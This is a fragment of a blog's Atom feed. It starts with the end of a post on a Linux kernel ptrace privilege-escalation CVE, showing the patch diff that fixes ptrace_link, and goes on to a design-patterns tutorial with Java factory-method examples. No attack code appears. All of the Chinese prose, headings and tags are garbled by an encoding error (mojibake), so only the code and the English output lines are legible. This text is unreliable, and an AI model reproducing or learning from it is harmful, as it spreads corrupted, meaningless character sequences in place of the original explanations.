*new_parent,</span><br><span class="line">  */</span><br><span class="line"> static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="deletion">-rcu_read_lock();</span></span><br><span class="line"><span class="deletion">-__ptrace_link(child, new_parent, __task_cred(new_parent));</span></span><br><span class="line"><span class="deletion">-rcu_read_unlock();</span></span><br><span class="line"><span class="addition">+__ptrace_link(child, new_parent, current_cred());</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™ä¸ªè¡¥ä¸åªåšäº†ä¸€ä»¶å°äº‹ï¼š</p><ul><li><strong>ä¸ä½¿ç”¨ rcu æœºåˆ¶ï¼Œå°† ptracee-&gt;parent_cred è®¾ä¸ºå½“å‰è¿›ç¨‹ credï¼Œå³ ptracee åŸæ¥çš„ cred</strong></li></ul><p>è¿™å°† ptracer çš„æƒé™é™åˆ¶ä¸ºå‘èµ· ptrace è¯·æ±‚çš„ ptracee çš„æƒé™ï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä½ ä¸è®¸è¯´ä»–ï¼Œä»–æ˜¯ä½ çˆ¹ï¼Ÿ&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="ptrace" scheme="http://blog.arttnba3.cn/tags/ptrace/"/>
    
  </entry>
  
  <entry>
    <title>ã€CODE.0x02ã€‘è½¯ä»¶å·¥ç¨‹ï¼šè®¾è®¡æ¨¡å¼æµ…æ</title>
    <link href="http://blog.arttnba3.cn/2022/01/04/CODE-0X02-DESIGN_PATTERN/"/>
    <id>http://blog.arttnba3.cn/2022/01/04/CODE-0X02-DESIGN_PATTERN/</id>
    <published>2022-01-03T16:50:06.000Z</published>
    <updated>2022-03-08T15:47:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®ğŸ‘´ä¸ä¼šå†™ä»£ç </p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å…ˆæ¥ä¸€æ®µé¢å‘ Wikipedia çš„åºŸè¯ï¼ˆ</p><blockquote><p>åœ¨è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œè®¾è®¡æ¨¡å¼ï¼ˆdesign patternï¼‰æ˜¯å¯¹è½¯ä»¶è®¾è®¡ä¸­æ™®éå­˜åœ¨ï¼ˆåå¤å‡ºç°ï¼‰çš„å„ç§é—®é¢˜ï¼Œæ‰€æå‡ºçš„è§£å†³æ–¹æ¡ˆã€‚è¿™ä¸ªæœ¯è¯­æ˜¯ç”±åŸƒé‡Œå¸ŒÂ·ä¼½ç›ï¼ˆErich Gammaï¼‰ç­‰äººåœ¨1990å¹´ä»£ä»å»ºç­‘è®¾è®¡é¢†åŸŸå¼•å…¥åˆ°è®¡ç®—æœºç§‘å­¦çš„ã€‚</p><p>è®¾è®¡æ¨¡å¼å¹¶ä¸ç›´æ¥ç”¨æ¥å®Œæˆä»£ç çš„ç¼–å†™ï¼Œè€Œæ˜¯æè¿°åœ¨å„ç§ä¸åŒæƒ…å†µä¸‹ï¼Œè¦æ€ä¹ˆè§£å†³é—®é¢˜çš„ä¸€ç§æ–¹æ¡ˆã€‚é¢å‘å¯¹è±¡è®¾è®¡æ¨¡å¼é€šå¸¸ä»¥ç±»åˆ«æˆ–å¯¹è±¡æ¥æè¿°å…¶ä¸­çš„å…³ç³»å’Œç›¸äº’ä½œç”¨ï¼Œä½†ä¸æ¶‰åŠç”¨æ¥å®Œæˆåº”ç”¨ç¨‹åºçš„ç‰¹å®šç±»åˆ«æˆ–å¯¹è±¡ã€‚è®¾è®¡æ¨¡å¼èƒ½ä½¿ä¸ç¨³å®šä¾èµ–äºç›¸å¯¹ç¨³å®šã€å…·ä½“ä¾èµ–äºç›¸å¯¹æŠ½è±¡ï¼Œé¿å…ä¼šå¼•èµ·éº»çƒ¦çš„ç´§è€¦åˆï¼Œä»¥å¢å¼ºè½¯ä»¶è®¾è®¡é¢å¯¹å¹¶é€‚åº”å˜åŒ–çš„èƒ½åŠ›ã€‚</p><p>å¹¶éæ‰€æœ‰çš„è½¯ä»¶æ¨¡å¼éƒ½æ˜¯è®¾è®¡æ¨¡å¼ï¼Œè®¾è®¡æ¨¡å¼ç‰¹æŒ‡è½¯ä»¶â€œè®¾è®¡â€å±‚æ¬¡ä¸Šçš„é—®é¢˜ã€‚è¿˜æœ‰å…¶ä»–éè®¾è®¡æ¨¡å¼çš„æ¨¡å¼ï¼Œå¦‚æ¶æ„æ¨¡å¼ã€‚åŒæ—¶ï¼Œ<strong>ç®—æ³•ä¸èƒ½ç®—æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼</strong>ï¼Œå› ä¸ºç®—æ³•ä¸»è¦æ˜¯ç”¨æ¥è§£å†³è®¡ç®—ä¸Šçš„é—®é¢˜ï¼Œè€Œéè®¾è®¡ä¸Šçš„é—®é¢˜ã€‚</p><p><a href="https://zh.wikipedia.org/wiki/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F_(%E8%AE%A1%E7%AE%97%E6%9C%BA)">è®¾è®¡æ¨¡å¼ (è®¡ç®—æœº) - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦ (wikipedia.org)</a></p></blockquote><p>ç¬”è€…æœ¬èº«ä¹Ÿä¸æ˜¯è½¯å·¥ä¸“ä¸šçš„ï¼Œæ‰€ä»¥ä¸‹æ–‡ä¸­ç¬”è€…çš„æ‹™è§å¯èƒ½æœ‰è¯¯ï¼Œè¿˜æœ›è¯»è€…ä¸åæŒ‡æ­£ã€‚</p></blockquote><p>åœ¨ç¬”è€…çœ‹æ¥ï¼Œé€šä¿—åœ°æ¥è¯´ï¼Œ<strong>è®¾è®¡æ¨¡å¼</strong>ï¼ˆdesign patternï¼‰å°±æ˜¯<strong>è½¯ä»¶çš„æ¶æ„è®¾è®¡é—®é¢˜</strong>â€”â€”æˆ‘ä»¬åœ¨å¦‚ä½•å»è®¾è®¡ã€ç»„ç»‡ä¸€ä¸ªè½¯ä»¶çš„æ¶æ„</p><p>å½“æˆ‘ä»¬è°ˆè®ºåˆ°è®¾è®¡æ¨¡å¼è¿™ä¸€è¯è¯­æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸æ˜¯åŸºäº<strong>é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡</strong>ï¼ˆObject Oriented Programmingï¼‰è¿™ä¸€åŸºç¡€å‡ºå‘ï¼Œè€Œéä¼ ç»Ÿçš„_é¢å‘è¿‡ç¨‹çš„ç¨‹åºè®¾è®¡_ï¼Œè¿™æ„å‘³ç€è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶è®¾è®¡çš„<strong>æŠ½è±¡å±‚é¢</strong>â€”â€”å³<strong>æˆ‘ä»¬å¹¶ä¸å…³æ³¨ç»†èŠ‚çš„å®ç°ï¼Œè€Œæ˜¯å…³æ³¨äºæ›´é«˜ä¸€å±‚çš„ç»„ç»‡</strong></p><p>æ–¹ä¾¿èµ·è§ï¼Œæœ¬ç¯‡ç¬”è€…é€‰ç”¨â€œæœ€é¢å‘å¯¹è±¡çš„è¯­è¨€â€â€”â€” Java è¯­è¨€æ¥è®²è§£ä¸åŒçš„è®¾è®¡æ¨¡å¼</p><h2 id="è®¾è®¡æ¨¡å¼çš„ç±»åˆ«"><a href="#è®¾è®¡æ¨¡å¼çš„ç±»åˆ«" class="headerlink" title="è®¾è®¡æ¨¡å¼çš„ç±»åˆ«"></a>è®¾è®¡æ¨¡å¼çš„ç±»åˆ«</h2><p>åœ¨ã€Š<strong>è®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€</strong>ã€‹ï¼ˆDesign Patterns: Elements of Reusable Object-Oriented Softwareï¼‰ä¸€ä¹¦ä¸­ï¼ŒGoF æ€»ç»“äº†<strong>23ç§è®¾è®¡æ¨¡å¼</strong>ï¼Œåˆ†ä¸ºä¸‰å¤§ç±»ï¼š</p><h3 id="åˆ›å»ºå‹æ¨¡å¼ï¼ˆ5ç§ï¼‰"><a href="#åˆ›å»ºå‹æ¨¡å¼ï¼ˆ5ç§ï¼‰" class="headerlink" title="åˆ›å»ºå‹æ¨¡å¼ï¼ˆ5ç§ï¼‰"></a>åˆ›å»ºå‹æ¨¡å¼ï¼ˆ5ç§ï¼‰</h3><ul><li>å·¥å‚æ–¹æ³•æ¨¡å¼</li><li>æŠ½è±¡å·¥å‚æ¨¡å¼</li><li>å•ä¾‹æ¨¡å¼</li><li>å»ºé€ è€…æ¨¡å¼</li><li>åŸå‹æ¨¡å¼</li></ul><h3 id="ç»“æ„å‹æ¨¡å¼ï¼ˆ7ç§ï¼‰"><a href="#ç»“æ„å‹æ¨¡å¼ï¼ˆ7ç§ï¼‰" class="headerlink" title="ç»“æ„å‹æ¨¡å¼ï¼ˆ7ç§ï¼‰"></a>ç»“æ„å‹æ¨¡å¼ï¼ˆ7ç§ï¼‰</h3><ul><li>é€‚é…å™¨æ¨¡å¼</li><li>è£…é¥°å™¨æ¨¡å¼</li><li>ä»£ç†æ¨¡å¼</li><li>å¤–è§‚æ¨¡å¼</li><li>æ¡¥æ¥æ¨¡å¼</li><li>ç»„åˆæ¨¡å¼</li><li>äº«å…ƒæ¨¡å¼</li></ul><h3 id="è¡Œä¸ºå‹æ¨¡å¼ï¼ˆ11ç§ï¼‰"><a href="#è¡Œä¸ºå‹æ¨¡å¼ï¼ˆ11ç§ï¼‰" class="headerlink" title="è¡Œä¸ºå‹æ¨¡å¼ï¼ˆ11ç§ï¼‰"></a>è¡Œä¸ºå‹æ¨¡å¼ï¼ˆ11ç§ï¼‰</h3><ul><li>ç­–ç•¥æ¨¡å¼</li><li>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</li><li>è§‚å¯Ÿè€…æ¨¡å¼</li><li>è¿­ä»£å­æ¨¡å¼</li><li>è´£ä»»é“¾æ¨¡å¼</li><li>å‘½ä»¤æ¨¡å¼</li><li>å¤‡å¿˜å½•æ¨¡å¼</li><li>çŠ¶æ€æ¨¡å¼</li><li>è®¿é—®è€…æ¨¡å¼</li><li>ä¸­ä»‹è€…æ¨¡å¼</li><li>è§£é‡Šå™¨æ¨¡å¼</li></ul><p>éšç€ç°ä»£è½¯ä»¶è®¾è®¡ç†è®ºçš„å‘å±•ï¼Œæ›´å¤šçš„è®¾è®¡æ¨¡å¼ä¹Ÿè¢«å¼€å‘äº†å‡ºæ¥ï¼Œé™¤äº†ä¹¦ä¸Šæ‰€è¿°çš„ä¸Šè¿°ä¸‰å¤§ç±»éƒ½åˆ†åˆ«æ–°å¢æœ‰è®¾è®¡æ¨¡å¼ä¹‹å¤–ï¼Œé’ˆå¯¹äºå¤šçº¿ç¨‹ä¸å¹¶å‘è½¯ä»¶è®¾è®¡ï¼Œè¿˜æ–°å¢äº†ä¸€ä¸ª<strong>å¹¶å‘å‹æ¨¡å¼</strong>ï¼Œä»¥åŠç”± Sun Java Center é‰´å®šçš„ J2EEæ¨¡å¼ç­‰ç­‰â€¦</p><p>æœ¬ç¯‡ä¸»è¦è¿˜æ˜¯è®²ä¹¦ä¸Šçš„23ç§è®¾è®¡æ¨¡å¼ï¼Œé¢å¤–çš„è®¾è®¡æ¨¡å¼å¦‚æœæœ‰æ—¶é—´å¯èƒ½ä¹Ÿä¼šè®²è®²</p><blockquote><p>å…¶å®ç¬”è€…æœ¬äººä¹Ÿè¿˜æ²¡ä¹°é’±è¿™æœ¬ä¹¦â€¦ï¼ˆ<del>ä½“è°…ä¸€å“ˆï¼ŒğŸ‘´æ˜¯å­¦ç”Ÿï¼Œå»ºè®®vğŸ‘´200</del>ï¼‰</p></blockquote><h1 id="0x01-åˆ›å»ºå‹æ¨¡å¼"><a href="#0x01-åˆ›å»ºå‹æ¨¡å¼" class="headerlink" title="0x01.åˆ›å»ºå‹æ¨¡å¼"></a>0x01.åˆ›å»ºå‹æ¨¡å¼</h1><p>åœ¨è½¯ä»¶å·¥ç¨‹ä¸­ï¼Œåˆ›å»ºå‹æ¨¡å¼æ˜¯ç”¨ä»¥å¤„ç†<strong>å¯¹è±¡åˆ›å»º</strong>çš„è®¾è®¡æ¨¡å¼ï¼Œè¯¥ç±»åˆ«æ¨¡å¼æ ¹æ®å®é™…æƒ…å†µä½¿ç”¨åˆé€‚çš„æ–¹å¼åˆ›å»ºå¯¹è±¡ï¼Œå› ä¸ºåŸºæœ¬çš„å¯¹è±¡åˆ›å»ºæ–¹å¼å¯èƒ½ä¼šå¯¼è‡´è®¾è®¡ä¸Šçš„é—®é¢˜ï¼Œæˆ–å¢åŠ è®¾è®¡çš„å¤æ‚åº¦</p><p>åˆ›å»ºå‹æ¨¡å¼çš„å…³æ³¨ç‚¹æ˜¯<strong>å¦‚ä½•åˆ›å»ºå¯¹è±¡</strong>ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯è¦<strong>æŠŠå¯¹è±¡çš„åˆ›å»ºå’Œä½¿ç”¨ç›¸åˆ†ç¦»</strong></p><blockquote><p>ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬åœ¨C++ä¸­ä½¿ç”¨ string ç±»çš„å„ç§æ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å…³æ³¨å…¶åº•å±‚ï¼ˆallocatorã€æ‰©å®¹â€¦ï¼‰æ˜¯å¦‚ä½•å®ç°çš„</p></blockquote><h2 id="ä¸€ã€å·¥å‚æ–¹æ³•æ¨¡å¼ï¼ˆFactory-method-patternï¼‰"><a href="#ä¸€ã€å·¥å‚æ–¹æ³•æ¨¡å¼ï¼ˆFactory-method-patternï¼‰" class="headerlink" title="ä¸€ã€å·¥å‚æ–¹æ³•æ¨¡å¼ï¼ˆFactory method patternï¼‰"></a>ä¸€ã€å·¥å‚æ–¹æ³•æ¨¡å¼ï¼ˆFactory method patternï¼‰</h2><p>å·¥å‚æ–¹æ³•æ¨¡å¼é€šå¸¸åˆç®€ç§°å·¥å‚æ¨¡å¼ï¼Œè¯¥è®¾è®¡æ¨¡å¼å¼•å…¥äº†ä¸€ç§åä¸ºâ€œå·¥å‚â€çš„æ¦‚å¿µâ€”â€”_<strong>ç”±ä¸€ä¸ªâ€œå·¥å‚â€æ¥â€œç”Ÿäº§â€å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„å¯¹è±¡</strong>_</p><p>åœ¨å·¥å‚æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬<strong>å°†å¯¹è±¡çš„åˆ›å»ºä¸å¯¹è±¡çš„ä½¿ç”¨è¿›è¡Œåˆ†å¼€</strong>ï¼Œå½“æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªâ€œå·¥å‚ç±»â€å¯¹è±¡å®ä¾‹ï¼Œåç»­çš„å¯¹è±¡åˆ›å»ºéƒ½ä»è¯¥â€œå·¥å‚â€ä¸­è·å¾—</p><p>ä¸‹å›¾æ˜¯<del>ç¬”è€…å·çš„</del>ä¸€å¼ æè¿°å·¥å‚æ¨¡å¼çš„å›¾</p><p>å‡è®¾æˆ‘ä»¬ç°åœ¨è¦å¸® Apple è®¾è®¡ä¸€ä¸ªç”Ÿäº§å·¥å‚æ¥ç”Ÿäº§æœ€æ–°çš„ iPhone13 å’Œ iPad5ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><h3 id="I-ç‰©å“æ¥å£"><a href="#I-ç‰©å“æ¥å£" class="headerlink" title="I.ç‰©å“æ¥å£"></a>I.ç‰©å“æ¥å£</h3><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦å®šä¹‰æˆ‘ä»¬â€œç”Ÿäº§â€çš„å¯¹è±¡çš„ç±»å‹ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬è¿™ä¸ªç”Ÿäº§å·¥å‚å¯ä»¥ç”Ÿäº§ iPhone13 å’Œ iPad5ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œä¾¿å®šä¹‰ä¸€ä¸ª_è®¾å¤‡ç±»çš„æ¥å£ç±»_ä½œä¸ºä¸åŒäº§å“çš„æ¥å£ï¼ŒåŒæ—¶å£°æ˜ä¸€äº›è¿™äº›è®¾å¤‡å…±æœ‰çš„æ–¹æ³•ï¼Œè¿™é‡Œéšä¾¿å®šä¹‰ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="II-å·¥å‚æ¥å£"><a href="#II-å·¥å‚æ¥å£" class="headerlink" title="II.å·¥å‚æ¥å£"></a>II.å·¥å‚æ¥å£</h3><p>è¦å®ç°ä¸åŒç±»å‹çš„å·¥å‚ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å…ˆå®šä¹‰ä¸€ä¸ªå·¥å‚ç±»çš„æ¥å£ç±»ï¼Œæˆ‘ä»¬è¦â€œç”Ÿäº§â€çš„æ˜¯ç”µå­è®¾å¤‡ï¼Œé‚£å°±å«_DeviceFactor_ å¥½äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    Device <span class="title function_">createDevice</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="III-ç‰©å“å®ä½“ç±»"><a href="#III-ç‰©å“å®ä½“ç±»" class="headerlink" title="III.ç‰©å“å®ä½“ç±»"></a>III.ç‰©å“å®ä½“ç±»</h3><p>æœ‰äº†ç‰©å“æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹å®šä¹‰ç›¸åº”çš„è®¾å¤‡äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPhone13.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPhone13 is going to reboot sooooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPad5.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPad5 is going to reboot sooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="IV-å·¥å‚ç±»"><a href="#IV-å·¥å‚ç±»" class="headerlink" title="IV.å·¥å‚ç±»"></a>IV.å·¥å‚ç±»</h3><p>æœ‰äº†å·¥å‚æ¥å£ä¸ç‰©å“æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹å®ç°æˆ‘ä»¬çš„å·¥å‚ç±»äº†ï¼Œå¯¹äº iPhone è€Œè¨€æˆ‘ä»¬éœ€è¦ä¸€ä¸ª iPhone13Factoryï¼Œè€Œå¯¹äº iPad5 æˆ‘ä»¬åˆ™éœ€è¦ä¸€ä¸ªç‹¬ç«‹çš„ iPad5 å·¥å‚ï¼Œç›¸åº”åœ°è¿™ä¸¤ä¸ªå·¥å‚éƒ½è¦å®ç° DeviceFactory æ¥å£çš„ <code>createDevice()</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13Factory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> iPhone13 <span class="title function_">createDevice</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPhone13</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5Factory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> iPad5 <span class="title function_">createDevice</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPad5</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="O-å·¥å‚æ–¹æ³•æ¨¡å¼çš„å·¥ä½œæ–¹å¼"><a href="#O-å·¥å‚æ–¹æ³•æ¨¡å¼çš„å·¥ä½œæ–¹å¼" class="headerlink" title="O.å·¥å‚æ–¹æ³•æ¨¡å¼çš„å·¥ä½œæ–¹å¼"></a><em>O.å·¥å‚æ–¹æ³•æ¨¡å¼çš„å·¥ä½œæ–¹å¼</em></h3><p>ä»¥ä¸‹æµ‹è¯•ä¸»ç¨‹åºç”¨ä»¥è¯´æ˜å·¥å‚æ–¹æ³•æ¨¡å¼å¦‚ä½•å·¥ä½œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FactoryMethodMode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">iPhone13Factory</span> <span class="variable">iphone_13_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPhone13Factory</span>();</span><br><span class="line">        <span class="type">iPad5Factory</span> <span class="variable">ipad_5_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPad5Factory</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">iPhone13</span> <span class="variable">iphone13</span> <span class="operator">=</span> iphone_13_factory.createDevice();</span><br><span class="line">        <span class="type">iPad5</span> <span class="variable">ipad5</span> <span class="operator">=</span> ipad_5_factory.createDevice();</span><br><span class="line"></span><br><span class="line">        iphone13.showScreen();</span><br><span class="line">        ipad5.showScreen();</span><br><span class="line"></span><br><span class="line">        iphone13.reboot();</span><br><span class="line">        ipad5.reboot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is screen of iPhone13.</span><br><span class="line">This is screen of iPad5.</span><br><span class="line">The iPhone13 is going to reboot sooooooon...</span><br><span class="line">The iPad5 is going to reboot sooooon...</span><br></pre></td></tr></table></figure><h2 id="äºŒã€æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract-factory-patternï¼‰"><a href="#äºŒã€æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract-factory-patternï¼‰" class="headerlink" title="äºŒã€æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract factory patternï¼‰"></a>äºŒã€æŠ½è±¡å·¥å‚æ¨¡å¼ï¼ˆAbstract factory patternï¼‰</h2><p>æŠ½è±¡å·¥å‚æ¨¡å¼ä¸å·¥å‚æ¨¡å¼ç›¸ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œåœ¨å·¥å‚æ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬ä»¥_ç‹¬ç«‹çš„å¯¹è±¡ç§ç±»_æ¥åˆ›å»ºå·¥å‚ï¼ˆä¾‹å¦‚ iPhone13å’Œ iPad5ï¼‰ï¼Œè€Œåœ¨æŠ½è±¡å·¥å‚æ¨¡å¼ä¸­ï¼Œåˆ™ä»¥<strong>åŒä¸€ç§ç±»åˆ«çš„å¯¹è±¡</strong>ä½œä¸ºåˆ’åˆ†çš„ä¾æ®â€”â€”<strong>æ¯ä¸€ç±»å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå·¥å‚ï¼Œè¯¥å·¥å‚ç”Ÿäº§åŒä¸€ç±»åˆ«çš„ä¸åŒç§ç±»çš„å¯¹è±¡å®ä¾‹</strong></p><p><img src="https://s2.loli.net/2022/01/04/PKxLXrTFRpWiNZg.png" alt="å·çš„å›¾"></p><p>è¿˜æ˜¯æ‹¿ Apple çš„å·¥å‚åšä¾‹å­ï¼Œè¿™é‡Œæˆ‘ä»¬æœ‰ä¸¤æ¡ç”Ÿäº§çº¿ï¼šä¸€æ¡ç”Ÿäº§å…¨ç³» iPhoneï¼Œå¦ä¸€æ¡ç”Ÿäº§å…¨ç³» iPad</p><h3 id="I-ç‰©å“æ¥å£-1"><a href="#I-ç‰©å“æ¥å£-1" class="headerlink" 